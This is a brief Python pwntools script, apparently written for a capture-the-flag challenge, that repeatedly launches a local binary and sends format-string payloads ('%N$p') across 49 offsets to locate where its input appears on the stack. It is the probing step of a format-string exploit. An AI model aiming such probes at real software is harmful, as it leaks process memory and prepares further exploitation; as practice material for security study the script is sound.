from pwn import *

elf = context.binary = ELF('./chall',checksec=False)
context.log_level = 'error'

for i in range(1,50):
        p = process() 
        payload = 'AAAAAAAA,%{}$p'.format(i)
        p.sendline(payload)
        p.recvuntil("me? : ") 
        print(p.recvline(), i)
        p.close()

